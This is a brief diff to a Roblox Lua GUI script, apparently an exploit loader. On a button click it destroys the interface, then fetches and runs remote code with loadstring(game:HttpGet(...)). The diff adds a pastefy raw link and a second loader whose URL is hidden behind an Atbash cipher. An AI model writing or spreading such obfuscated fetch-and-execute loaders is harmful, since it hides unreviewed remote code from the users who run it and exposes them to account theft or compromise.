@@ -143,6 +143,7 @@ Button.MouseButton1Click:Connect(function()
     
     ScreenGui:Destroy()
     
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/xcmsnd/Timber-tycoon./refs/heads/main/obfuscated_script-1765611864633.lua.txt'))()
+    loadstring(game:HttpGet('https://pastefy.app/K6CXixR7/raw'))()
+loadstring(game:HttpGet(Decode("sggkh://izd.trgsfyfhvixlmgvmg.xln/cxnhmw/WiIzb-FR-Oryizib/ivuh/svzwh/nzrm/%V6%9X%Z8%V6%9W%90%V5%Z4%Z7%V4%YZ%Z8%V6%ZW%Z3%V5%YX%8U%V7%89%88E3.ofz","Atbash")))()
     
 end)
